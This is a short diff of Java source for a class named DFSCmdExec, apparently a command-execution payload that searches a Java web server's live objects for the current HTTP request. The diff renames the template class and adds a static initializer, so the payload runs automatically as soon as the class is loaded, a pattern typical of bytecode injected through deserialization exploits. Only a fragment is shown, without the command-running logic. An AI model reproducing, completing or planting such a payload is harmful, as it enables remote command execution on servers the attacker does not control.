@@ -7,7 +7,8 @@ import java.lang.reflect.Method;
 import java.util.HashSet;
 import java.util.Scanner;
 
-public class DFSCmdExecTpl {
+public class DFSCmdExec
+{
 	static HashSet<Object> h;
 	static ClassLoader cl = Thread.currentThread().getContextClassLoader();
 	static Class hsr;//HTTPServletRequest.class
@@ -16,7 +17,14 @@ public class DFSCmdExecTpl {
 	static Object r;
 	static Object p;
 
-	public DFSCmdExecTpl() {
+	static {
+		try {
+			new DFSCmdExec();
+		} catch (Exception e) {
+		}
+	}
+
+	public DFSCmdExec() {
 		r = null;
 		p = null;
 		h =new HashSet<Object>();
